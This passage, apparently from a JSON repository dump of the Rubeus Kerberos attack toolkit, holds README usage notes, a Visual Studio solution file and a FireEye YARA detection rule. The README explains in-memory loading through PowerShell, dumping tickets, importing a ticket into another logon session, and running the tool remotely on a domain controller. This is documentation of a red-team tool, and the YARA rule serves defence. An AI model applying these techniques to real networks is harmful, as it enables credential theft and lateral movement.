elevated.\r\n\r\n    C:\\Rubeus>Rubeus.exe logonsession\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.1.0\r\n\r\n\r\n    [*] Action: Display current logon session information\r\n\r\n        LUID          : 0x28a8fd (2664701)\r\n        UserName      : harmj0y\r\n        LogonDomain   : THESHIRE\r\n        SID           : S-1-5-21-937929760-3187473010-80948926-1104\r\n        AuthPackage   : Kerberos\r\n        LogonType     : Interactive (2)\r\n        Session       : 1\r\n        LogonTime     : 6/9/2022 1:17:48 PM\r\n        LogonServer   : DC\r\n        DnsDomainName : THESHIRE.LOCAL\r\n        Upn           : harmj0y@theshire.local\r\n\r\nIf elevated, the `/current` flag will display information for just the current logon session, and `/luid:X` will display information about the target specified logon session.\r\n\r\n\r\n### asrep2kirbi\r\n\r\nThe **asrep2kirbi** action will convert an AS-REP and a client key to a Kirbi. \r\n\r\nThe client key can be supplied as a Base64 encoded blob or as a hex string.\r\n\r\n### kirbi\r\n\r\nThe **kirbi** action is used to manipulate Kirbi's (KERB_CRED's).\r\n\r\nCurrently it only supports modifying/inserting a session key using the **/sessionkey:SESSIONKEY** and **/sessionetype:DES|RC4|AES128|AES256** arguments, passing the Kirbi in using the **/kirbi:X** argument.\r\n\r\n## Compile Instructions\r\n\r\nWe are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)\r\n\r\nRubeus has been built against .NET 3.5 and is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Simply open up the project .sln, choose \"Release\", and build.\r\n\r\n### Targeting other .NET versions\r\n\r\nRubeus' default build configuration is for .NET 3.5, which will fail on systems without that version installed. To target Rubeus for .NET 4 or 4.5, open the .sln solution, go to **Project** -> **Rubeus Properties** and change the \"Target framework\" to another version.\r\n\r\n### Sidenote: Building Rubeus as a Library\r\n\r\nTo build Rubeus as a library, under **Project** -> **Rubeus Properties** -> change **Output type** to **Class Library**. Compile, and add the Rubeus.dll as a reference to whatever project you want. Rubeus functionality can then be invoked as in a number of ways:\r\n\r\n\r\n    // pass the Main method the arguments you want\r\n    Rubeus.Program.Main(\"dump /luid:3050142\".Split());\r\n\r\n    // or invoke specific functionality manually\r\n    Rubeus.LSA.ListKerberosTicketDataAllUsers(new Rubeus.Interop.LUID());\r\n\r\n\r\nYou can then use [ILMerge](https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630) to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.\r\n\r\n\r\n### Sidenote: Running Rubeus Through PowerShell\r\n\r\nIf you want to run Rubeus in-memory through a PowerShell wrapper, first compile the Rubeus and base64-encode the resulting assembly:\r\n\r\n    [Convert]::ToBase64String([IO.File]::ReadAllBytes(\"C:\\Temp\\Rubeus.exe\")) | Out-File -Encoding ASCII C:\\Temp\\rubeus.txt\r\n\r\nRubeus can then be loaded in a PowerShell script with the following (where \"aa...\" is replaced with the base64-encoded Rubeus assembly string):\r\n\r\n    $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(\"aa...\"))\r\n\r\nThe Main() method and any arguments can then be invoked as follows:\r\n\r\n    [Rubeus.Program]::Main(\"dump /user:administrator\".Split())\r\n\r\nOr individual functions can be invoked:\r\n\r\n    $TicketBytes = [convert]::FromBase64String('BASE64_KERB_TICKET')\r\n    # start mmc.exe as netonly, not-hidden\r\n    $LogonID = [Rubeus.Helpers]::CreateProcessNetOnly(\"mmc.exe\", $true)\r\n    # apply the ticket to mmc's logon session\r\n    [Rubeus.LSA]::ImportTicket($TicketBytes, $LogonID)\r\n\r\n#### Sidenote Sidenote: Running Rubeus Over PSRemoting\r\n\r\nDue to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, Rubeus has a function to help with that.\r\n\r\nIf you follow the instructions in [Sidenote: Running Rubeus Through PowerShell](#sidenote-running-rubeus-through-powershell) to create a Rubeus.ps1, append something like the following to the script:\r\n\r\n    [Rubeus.Program]::MainString(\"triage\")\r\n\r\nYou should then be able to run Rubeus over PSRemoting with something like the following:\r\n\r\n    $s = New-PSSession dc.theshire.local\r\n    Invoke-Command -Session $s -FilePath C:\\Temp\\Rubeus.ps1\r\n\r\nAlternatively, Rubeus' `/consoleoutfile:C:\\FILE.txt` argument will redirect all output streams to the specified file.\r\n"
        },
        {
          "name": "Rubeus.sln",
          "type": "blob",
          "size": 0.9619140625,
          "content": "﻿\r\nMicrosoft Visual Studio Solution File, Format Version 12.00\r\n# Visual Studio 14\r\nVisualStudioVersion = 14.0.25420.1\r\nMinimumVisualStudioVersion = 10.0.40219.1\r\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"Rubeus\", \"Rubeus\\Rubeus.csproj\", \"{658C8B7F-3664-4A95-9572-A3E5871DFC06}\"\r\nEndProject\r\nGlobal\r\n\tGlobalSection(SolutionConfigurationPlatforms) = preSolution\r\n\t\tDebug|Any CPU = Debug|Any CPU\r\n\t\tRelease|Any CPU = Release|Any CPU\r\n\tEndGlobalSection\r\n\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\r\n\t\t{658C8B7F-3664-4A95-9572-A3E5871DFC06}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\r\n\t\t{658C8B7F-3664-4A95-9572-A3E5871DFC06}.Debug|Any CPU.Build.0 = Debug|Any CPU\r\n\t\t{658C8B7F-3664-4A95-9572-A3E5871DFC06}.Release|Any CPU.ActiveCfg = Release|Any CPU\r\n\t\t{658C8B7F-3664-4A95-9572-A3E5871DFC06}.Release|Any CPU.Build.0 = Release|Any CPU\r\n\tEndGlobalSection\r\n\tGlobalSection(SolutionProperties) = preSolution\r\n\t\tHideSolutionNode = FALSE\r\n\tEndGlobalSection\r\nEndGlobal\r\n"
        },
        {
          "name": "Rubeus.yar",
          "type": "blob",
          "size": 0.705078125,
          "content": "// From https://github.com/fireeye/red_team_tool_countermeasures/blob/3a773645093e77107dfc4e3b29eb74845cc2f25d/rules/RUBEUS/production/yara/HackTool_MSIL_Rubeus_1.yar\n// License: BSD 2-clause\nrule HackTool_MSIL_Rubeus_1\n{\n    meta:\n        description = \"The TypeLibGUID present in a .NET binary maps directly to the ProjectGuid found in the '.csproj' file of a .NET project. This rule looks for .NET PE files that contain the ProjectGuid found in the public Rubeus project.\"\n        md5 = \"66e0681a500c726ed52e5ea9423d2654\"\n        rev = 4\n        author = \"FireEye\"\n    strings:\n        $typelibguid = \"658C8B7F-3664-4A95-9572-A3E5871DFC06\" ascii nocase wide\n    condition:\n        uint16(0) == 0x5A4D and $typelibguid\n}"
        },
        {
          "name": "Rubeus",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}